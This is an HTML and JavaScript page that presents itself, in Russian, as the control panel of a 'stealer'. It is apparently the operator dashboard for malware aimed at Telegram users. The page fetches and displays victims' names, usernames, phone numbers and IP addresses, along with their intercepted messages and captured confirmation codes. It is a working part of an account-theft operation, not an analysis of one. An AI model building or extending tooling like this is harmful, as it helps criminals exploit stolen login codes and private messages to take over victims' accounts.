<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Панель управления стилером</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        body {
            background: #f4f6f9;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .user-card {
            cursor: pointer;
            transition: 0.2s;
            border-left: 4px solid transparent;
        }
        .user-card:hover {
            background-color: #e9ecef;
        }
        .user-card.active {
            border-left-color: #0d6efd;
            background-color: #e7f1ff;
        }
        .log-table {
            font-size: 0.9rem;
        }
        .log-table td {
            vertical-align: middle;
        }
        .badge-out {
            background-color: #0d6efd;
        }
        .badge-in {
            background-color: #198754;
        }
        .pre-scrollable {
            max-height: 600px;
            overflow-y: auto;
        }
        .tab-pane {
            padding-top: 15px;
        }
        .user-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #0d6efd;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1.2rem;
            margin-right: 12px;
            flex-shrink: 0;
        }
        .user-info {
            flex: 1;
        }
        .user-info small {
            color: #6c757d;
        }
    </style>
</head>
<body>
    <div class="container-fluid py-4">
        <div class="row">
            <!-- Левая панель: список пользователей -->
            <div class="col-md-3 col-lg-2 mb-4">
                <div class="card shadow-sm">
                    <div class="card-header bg-primary text-white">
                        <i class="bi bi-people-fill"></i> Пользователи
                    </div>
                    <div class="card-body p-0 pre-scrollable" style="max-height: 80vh;">
                        <div id="userList" class="list-group list-group-flush">
                            <div class="text-center p-3">
                                <div class="spinner-border text-primary" role="status">
                                    <span class="visually-hidden">Загрузка...</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Правая панель: детали -->
            <div class="col-md-9 col-lg-10">
                <div class="card shadow-sm">
                    <div class="card-header bg-secondary text-white d-flex justify-content-between align-items-center">
                        <span><i class="bi bi-info-circle"></i> Данные пользователя</span>
                        <span id="selectedUserLabel" class="badge bg-light text-dark">не выбран</span>
                    </div>
                    <div class="card-body">
                        <!-- Вкладки -->
                        <ul class="nav nav-tabs" id="logTabs" role="tablist">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button" role="tab">Профиль</button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="messages-tab" data-bs-toggle="tab" data-bs-target="#messages" type="button" role="tab">Сообщения <span class="badge bg-secondary" id="msgCount">0</span></button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="codes-tab" data-bs-toggle="tab" data-bs-target="#codes" type="button" role="tab">Коды <span class="badge bg-secondary" id="codeCount">0</span></button>
                            </li>
                        </ul>
                        <div class="tab-content" id="logTabsContent">
                            <!-- Профиль -->
                            <div class="tab-pane fade show active" id="profile" role="tabpanel">
                                <div id="profileContent" class="mt-3">
                                    <div class="alert alert-info">Выберите пользователя слева</div>
                                </div>
                            </div>
                            <!-- Сообщения -->
                            <div class="tab-pane fade" id="messages" role="tabpanel">
                                <div id="messagesContent" class="mt-3">
                                    <div class="alert alert-info">Выберите пользователя слева</div>
                                </div>
                            </div>
                            <!-- Коды -->
                            <div class="tab-pane fade" id="codes" role="tabpanel">
                                <div id="codesContent" class="mt-3">
                                    <div class="alert alert-info">Выберите пользователя слева</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Глобальное состояние
        let currentUser = null;

        // Загрузка списка пользователей
        async function loadUsers() {
            try {
                const resp = await fetch('/api/users');
                const users = await resp.json();
                const container = document.getElementById('userList');
                if (!users.length) {
                    container.innerHTML = '<div class="list-group-item text-center">Нет данных</div>';
                    return;
                }
                container.innerHTML = '';
                users.forEach(u => {
                    const initials = (u.first_name?.[0] || '') + (u.last_name?.[0] || '') || '?';
                    const div = document.createElement('div');
                    div.className = 'list-group-item list-group-item-action user-card d-flex align-items-center';
                    div.dataset.userId = u.user_id;
                    div.innerHTML = `
                        <div class="user-avatar">${initials.toUpperCase()}</div>
                        <div class="user-info">
                            <div><strong>${u.first_name || ''} ${u.last_name || ''}</strong></div>
                            <small>@${u.username || 'no username'} • ID: ${u.user_id}</small>
                        </div>
                    `;
                    div.addEventListener('click', () => selectUser(u.user_id));
                    container.appendChild(div);
                });
                // Если был выбран ранее, активируем
                if (currentUser) {
                    highlightUser(currentUser);
                }
            } catch (e) {
                document.getElementById('userList').innerHTML = `<div class="list-group-item text-danger">Ошибка загрузки: ${e.message}</div>`;
            }
        }

        function highlightUser(userId) {
            document.querySelectorAll('.user-card').forEach(el => el.classList.remove('active'));
            const target = document.querySelector(`.user-card[data-user-id="${userId}"]`);
            if (target) target.classList.add('active');
        }

        async function selectUser(userId) {
            currentUser = userId;
            highlightUser(userId);
            document.getElementById('selectedUserLabel').textContent = `Пользователь ${userId}`;
            // Загружаем данные
            try {
                const resp = await fetch(`/api/logs?user_id=${userId}`);
                const data = await resp.json();
                if (data.error) {
                    alert(data.error);
                    return;
                }
                renderProfile(data.init);
                renderMessages(data.messages);
                renderCodes(data.codes);
            } catch (e) {
                alert('Ошибка загрузки данных: ' + e.message);
            }
        }

        function renderProfile(initData) {
            const container = document.getElementById('profileContent');
            if (!initData) {
                container.innerHTML = '<div class="alert alert-warning">Нет данных профиля</div>';
                return;
            }
            container.innerHTML = `
                <div class="row">
                    <div class="col-md-6">
                        <ul class="list-group">
                            <li class="list-group-item"><strong>ID:</strong> ${initData.user_id || '—'}</li>
                            <li class="list-group-item"><strong>Имя:</strong> ${initData.first_name || '—'} ${initData.last_name || ''}</li>
                            <li class="list-group-item"><strong>Username:</strong> @${initData.username || '—'}</li>
                            <li class="list-group-item"><strong>Телефон:</strong> ${initData.phone || '—'}</li>
                        </ul>
                    </div>
                    <div class="col-md-6">
                        <ul class="list-group">
                            <li class="list-group-item"><strong>Premium:</strong> ${initData.is_premium ? '✅ Да' : '❌ Нет'}</li>
                            <li class="list-group-item"><strong>IP адрес:</strong> ${initData.ip || '—'}</li>
                            <li class="list-group-item"><strong>Версия приложения:</strong> ${initData.app_version || '—'}</li>
                            <li class="list-group-item"><strong>Время сбора:</strong> ${new Date(initData.timestamp * 1000).toLocaleString()}</li>
                        </ul>
                    </div>
                </div>
            `;
        }

        function renderMessages(messages) {
            const container = document.getElementById('messagesContent');
            document.getElementById('msgCount').textContent = messages.length;
            if (!messages.length) {
                container.innerHTML = '<div class="alert alert-info">Нет сообщений</div>';
                return;
            }
            let html = `<div class="table-responsive"><table class="table table-hover log-table"><thead><tr>
                <th>Время</th><th>Направление</th><th>Текст</th><th>Peer</th><th>Отправитель</th>
            </tr></thead><tbody>`;
            messages.forEach(m => {
                const ts = m.ts ? new Date(m.ts * 1000).toLocaleString() : '—';
                const direction = m.out ? '<span class="badge badge-out">Исх.</span>' : '<span class="badge badge-in">Вх.</span>';
                const peer = m.peer || '—';
                const sender = m.sender || '—';
                const text = (m.text || '').substring(0, 200) + (m.text && m.text.length > 200 ? '…' : '');
                html += `<tr><td>${ts}</td><td>${direction}</td><td>${text}</td><td>${peer}</td><td>${sender}</td></tr>`;
            });
            html += '</tbody></table></div>';
            container.innerHTML = html;
        }

        function renderCodes(codes) {
            const container = document.getElementById('codesContent');
            document.getElementById('codeCount').textContent = codes.length;
            if (!codes.length) {
                container.innerHTML = '<div class="alert alert-info">Нет кодов подтверждения</div>';
                return;
            }
            let html = `<div class="table-responsive"><table class="table table-hover log-table"><thead><tr>
                <th>Время</th><th>Код</th><th>Peer</th><th>Отправитель</th>
            </tr></thead><tbody>`;
            codes.forEach(c => {
                const ts = c.timestamp ? new Date(c.timestamp * 1000).toLocaleString() : '—';
                const code = c.code || '—';
                const peer = c.peer || '—';
                const sender = c.sender || '—';
                html += `<tr><td>${ts}</td><td><span class="badge bg-danger">${code}</span></td><td>${peer}</td><td>${sender}</td></tr>`;
            });
            html += '</tbody></table></div>';
            container.innerHTML = html;
        }

        // Инициализация
        loadUsers();
        // Обновление списка пользователей каждые 30 секунд (опционально)
        setInterval(loadUsers, 30000);
    </script>
</body>
</html>
